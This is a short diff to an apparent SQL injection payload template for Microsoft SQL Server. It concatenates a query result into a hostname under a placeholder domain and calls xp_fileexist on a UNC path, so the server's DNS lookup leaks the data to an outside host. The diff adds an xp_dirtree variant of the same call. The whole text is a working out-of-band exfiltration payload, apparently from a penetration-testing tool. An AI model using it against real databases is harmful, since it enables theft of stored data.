@@ -1,3 +1,4 @@
 DECLARE @host varchar(1024);
 SELECT @host = '%PREFIX%.' + (%QUERY%) + '.%SUFFIX%' + '.%DOMAIN%';
 EXEC('xp_fileexist "\\' + @host + '\c$boot.ini"');
+# or EXEC('xp_dirtree "\\' + @host + '."');
